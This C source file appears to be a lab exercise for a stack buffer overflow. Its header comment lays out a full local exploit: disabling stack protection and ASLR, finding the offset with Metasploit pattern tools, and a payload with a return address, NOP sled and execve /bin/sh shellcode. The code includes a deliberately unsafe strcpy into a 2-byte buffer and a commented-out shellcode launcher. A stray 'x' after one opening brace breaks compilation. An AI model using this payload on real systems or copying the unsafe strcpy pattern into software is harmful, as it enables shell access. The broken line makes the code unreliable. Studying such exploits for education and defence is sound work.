

/*
POC of stack-buffer-overflow
gcc vulnerable.c -o vulnerable -fno-stack-protector
execstack -s ./vulnerable
echo 0 > /proc/sys/kernel/randomize_va_space
edb --run ./vulnerable $(python -c 'print "A"*200')
/usr/share/metasploit-framework/tools/pattern_create.rb 200
edb --run ./vulnerable Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag
/usr/share/metasploit-framework/tools/pattern_offset.rb 31624130 #get offset 32
edb --run ./vulnerable $(python -c 'print("A"*32 + "B"*4 + "C"*164)')
use Linux/x86 execve /bin/sh shellcode 23 bytes http://shell-storm.org/shellcode/files/shellcode-827.php
edb --run ./vulnerable $(python -c 'print "A"*32 + "\x90\xf1\xff\xbf" +"\x90"*141 + "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80"')
*/

//#include <stdio.h>
//#include <string.h>
//
//int main(int argc, char** argv)
//{
//    char buffer[20];
//    strcpy(buffer, argv[1]);
//    printf("%s\n",buffer);
//    return 0;
//}

/*
gcc -o fuzzme -fno-stack-protector fuzzme.c
*/

#include <stdio.h>
#include <string.h>

int bdcode(char *bdinput)
{x
    char stuff[2];
    strcpy(stuff, bdinput);
    printf("the following data : %s\n",stuff);
    return 0;
}

int main(int argc, char** argv)
{
    bdcode(argv[1]);
    return 0;
}

///* call_shellcode.c */
///*A program that creates a file containing code for launching shell*/
//#include <stdlib.h>
//#include <stdio.h>
//#include <string.h>
//const char code[] =
//        "\x31\xc0" /* Line 1: xorl %eax,%eax */
//                "\x50" /* Line 2: pushl %eax */
//                "\x68""//sh" /* Line 3: pushl $0x68732f2f */
//                "\x68""/bin" /* Line 4: pushl $0x6e69622f */
//                "\x89\xe3" /* Line 5: movl %esp,%ebx */
//                "\x50" /* Line 6: pushl %eax */
//                "\x53" /* Line 7: pushl %ebx */
//                "\x89\xe1" /* Line 8: movl %esp,%ecx */
//                "\x99" /* Line 9: cdq */
//                "\xb0\x0b" /* Line 10: movb $0x0b,%al */
//                "\xcd\x80" /* Line 11: int $0x80 */
//;
//
//int main(int argc, char **argv)
//{
//    char buf[sizeof(code)];
//    strcpy(buf, code);
//    ((void(*)( ))buf)( );
//}

//#include <stdio.h>
//#include <string.h>
//
//int main(int argc, char* argv[]) {
//    char date[10];
//    strcpy(date, argv[1]);
//    printf("test");
//    return 0;
//}


// strcpy(buffer, str);
//mov eax,DWORDPTR [ebp+8]      // Load the str parameter into eax.
//mov DWORD PTR [esp+4],eax     // Set str as the second argument to strcpy.
//lea eax,[ebp-16]              // Load the address of the buffer into eax.
//mov DWORD PTR [esp],eax       // Set the address as the first argument to strcpy.
//call 0x80482c4 <strcpy@plt>   // Call strcpy.